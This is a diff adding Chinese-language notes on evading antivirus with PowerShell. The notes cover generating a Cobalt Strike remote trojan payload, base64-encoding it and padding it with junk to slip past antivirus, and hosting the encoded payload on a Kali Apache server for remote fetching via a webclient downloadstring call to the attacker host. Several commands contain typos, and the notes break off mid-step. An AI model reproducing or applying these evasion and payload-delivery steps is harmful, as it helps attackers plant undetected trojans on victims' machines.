@@ -1,0 +1,24 @@
+1.powershell过免杀:
+   更多更丰富,windows7 以上自带;
+2.过程:
+   cs生成powershell远程木马,    payload 生成器,不建议选64位;
+   powershell     .ps1后缀,编辑代开, 更多里面的powershell运行;
+   powershell  command    txt文档,直接复制到cmd里卖弄运行,或者powershell运行
+3.被杀掉了所以要把核心代码做处理:
+    使用转码工具(超级加解密转换工具)将变量核心代码进行base64编码转换,然后在代码中加入一段base64的解码值;
+    (1)核心:添加垃圾,干扰杀毒软件:
+    方法一:base64转码前加入垃圾,然后转码,在代码中加入解码值后对垃圾进行过滤替换;
+    方法二:base64转码后加入垃圾,然后进行对垃圾的过滤替换;
+    方法三:将加密值上传网站,利用powershell可以访问网站的功能在线请求这段代码
+        根据方法一,将最后合成的文件放到kali apache2网站里;
+        (1)service apache2 start
+           出现报错的话更改apache端口;
+           cd /etc/apache2
+           vim ports.conf  将lisen80 改为随便端口
+        (2)将xuzhu.txt文档放入apache网页目录中:
+           mv/home/kali/Dektop/xuzhu.txt /var/www/html/xuzhu.txt
+           修改权限:  chmod 777 xuzhu.txt
+        (3)更改代码:
+          $doit=((wew-orject system net.webclient).downloadstring("http://kali ip/xuzhu.txt"))
+        (4)在木马上改完后解码
+        
